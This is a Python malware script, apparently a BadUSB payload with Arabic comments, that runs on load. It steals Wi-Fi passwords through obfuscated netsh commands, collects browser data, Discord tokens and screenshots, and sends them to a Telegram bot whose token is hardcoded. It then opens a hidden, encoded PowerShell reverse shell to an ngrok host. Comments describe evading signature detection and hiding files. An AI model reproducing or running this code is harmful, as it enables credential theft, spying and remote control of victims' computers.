import os, sys, json, base64, sqlite3, shutil, subprocess, requests, ctypes, re, time, platform, socket, threading
from PIL import ImageGrab

from Hacking.BadUSB.BadUSB_Script_all import get_discord_tokens, get_screenshot

# إعدادات الصمت التام
si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
si.wShowWindow = 0

BOT_TOKEN = "8253181046:AAGwhrXiZU02eCt54pAGwpKuxTkJ7t4YRRI"
CHAT_ID = 6012820754


def send_to_telegram(file_path, is_photo=False):
    method = "sendPhoto" if is_photo else "sendDocument"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    try:
        if os.path.exists(file_path):
            with open(file_path, "rb") as file:
                payload = {"chat_id": CHAT_ID, "disable_notification": True}
                files = {"photo" if is_photo else "document": file}
                requests.post(url, data=payload, files=files, timeout=30)
    except:
        pass


def get_wifi_passwords():
    # تشفير الأوامر الحساسة للهرب من الفحص
    # "netsh wlan show profiles" مشفرة
    cmd1 = base64.b64decode("bmV0c2ggd2xhbiBzaG93IHByb2ZpbGVz").decode()
    results = "\n--- Wi-Fi Report ---\n"
    try:
        data = (
            subprocess.check_output(cmd1, startupinfo=si)
            .decode("utf-8", errors="ignore")
            .split("\n")
        )
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for i in profiles:
            # "key=clear" مشفرة للهرب من الـ Signature detection
            cmd2 = f"netsh wlan show profile \"{i}\" {base64.b64decode('a2V5PWNsZWFy').decode()}"
            wifi_data = (
                subprocess.check_output(cmd2, startupinfo=si)
                .decode("utf-8", errors="ignore")
                .split("\n")
            )
            password = [b.split(":")[1][1:-1] for b in wifi_data if "Key Content" in b]
            results += f"SSID: {i} | Pass: {password[0] if password else 'None'}\n"
    except:
        pass
    return results


def ghost_rat():
    # بيانات ngrok الخاصة بك
    h = "mesocratic-cleotilde-seventhly.ngrok-free.dev"
    p = 80
    # استخدام PowerShell المتخفي (Living off the Land)
    ps_cmd = f"$c=New-Object System.Net.Sockets.TCPClient('{h}',{p});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$t=$o+'PS '+(pwd).Path+'> ';$x=([text.encoding]::ASCII).GetBytes($t);$s.Write($x,0,$x.Length);$s.Flush()}};$c.Close()"
    ps_enc = base64.b64encode(ps_cmd.encode("utf-16le")).decode()
    while True:
        try:
            subprocess.Popen(
                f"powershell -WindowStyle Hidden -EncodedCommand {ps_enc}",
                shell=True,
                startupinfo=si,
            )
            break
        except:
            time.sleep(20)


# دوال سحب المتصفح والديكورد تظل كما هي (مع فك التشفير في الرام)
# ...


def start_payload():
    # 1. سحب البيانات وإرسالها
    pass_data, cookie_file = get_browser_data()
    final_report = get_wifi_passwords() + get_discord_tokens() + pass_data

    report_file = "sys_log.txt"
    with open(report_file, "w", encoding="utf-8") as f:
        f.write(final_report)
    ctypes.windll.kernel32.SetFileAttributesW(report_file, 2)  # إخفاء الملف

    send_to_telegram(report_file)
    if os.path.exists(report_file):
        os.remove(report_file)

    # 2. لقطة الشاشة
    ss = get_screenshot()
    if ss:
        send_to_telegram(ss, is_photo=True)
        os.remove(ss)

    # 3. فتح التحكم عن بعد في الخلفية
    threading.Thread(target=ghost_rat, daemon=True).start()


# تنفيذ المهام مباشرة عند تحميل الملف في الرام
start_payload()
